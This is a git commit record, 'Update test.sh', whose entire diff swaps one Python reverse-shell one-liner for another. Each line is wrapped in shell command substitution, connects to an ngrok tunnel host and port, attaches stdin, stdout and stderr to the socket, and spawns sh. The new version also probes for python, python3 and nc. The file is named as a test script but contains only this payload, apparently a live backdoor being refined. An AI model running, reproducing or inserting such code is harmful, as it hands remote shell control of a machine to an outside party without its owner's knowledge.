e575dca326824f6ef2e66626e0fd88131d95d25b
DrixAxe <88616717+DrixAxe@users.noreply.github.com>
2024-11-05 18:03:32 +0200

    Update test.sh

--- test.sh
+++ test.sh
@@ -1,1 +1,1 @@
-$(export RHOST="6.tcp.eu.ngrok.io";export RPORT=15484;/usr/bin/python -c 'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("sh")')
+$(which python; which python3; which nc; export RHOST="6.tcp.eu.ngrok.io";export RPORT=15484;/usr/bin/python3 -c 'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("sh")')
